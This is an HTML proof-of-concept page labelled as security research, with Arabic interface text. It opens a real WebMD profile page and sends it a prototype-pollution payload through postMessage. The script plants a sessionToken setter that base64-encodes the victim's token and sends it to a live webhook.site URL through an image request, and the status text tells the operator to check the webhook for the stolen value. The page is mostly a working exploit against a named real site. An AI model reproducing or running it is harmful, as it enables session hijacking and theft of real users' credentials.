<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>WebMD Security Research PoC</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; shadow: 0 4px 6px rgba(0,0,0,0.1); }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
        #status { margin-top: 20px; color: #666; font-family: monospace; }
    </style>
</head>
<body>

<div class="box">
    <h2>اختبار أمني لثغرة Prototype Pollution</h2>
    <p>اضغط على الزر أدناه لمحاكاة ضغطة الضحية:</p>
    <button onclick="startAttack()">مشاهدة العرض (Start Exploit)</button>
    <div id="status"></div>
</div>

<script>
    function startAttack() {
        const status = document.getElementById('status');
        const myWebhook = "https://webhook.site/6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0";
        
        status.innerText = "> جاري فتح الموقع الضحية...";
        
        // 1. فتح الموقع (الآن سيعمل لأنها داخل دالة مرتبطة بـ Click)
        const victimWin = window.open("https://member.webmd.com/profile", "_blank");

        if (!victimWin) {
            alert("يرجى السماح بالنوافذ المنبثقة (Pop-ups) لهذا الملف!");
            return;
        }

        // 2. الانتظار حتى يتم تحميل الموقع
        setTimeout(() => {
            status.innerText = "> جاري إرسال السم عبر postMessage...";
            
        victimWin.postMessage({
    type: "set-config",
    data: {
        "__proto__": {
            "WBMD_AUTH": "init", // تسميم الكوكيز كخاصية
            "userToken": "init",
            
            // استخدام Getter/Setter ذكي لا يكسر الكود
            "sessionToken": {
                "set": `function(val) { 
                    this._st = val; 
                    new Image().src = "${myWebhook}?token=" + btoa(val);
                }`,
                "get": `function() { return this._st; }`
            }
        }
    }
}, "*");

            status.innerText = "> تم التنفيذ! تحقق من الـ Webhook الآن.";
        }, 8000); // زدنا الوقت لـ 8 ثوانٍ لضمان التحميل الكامل
    }
</script>

</body>
</html>
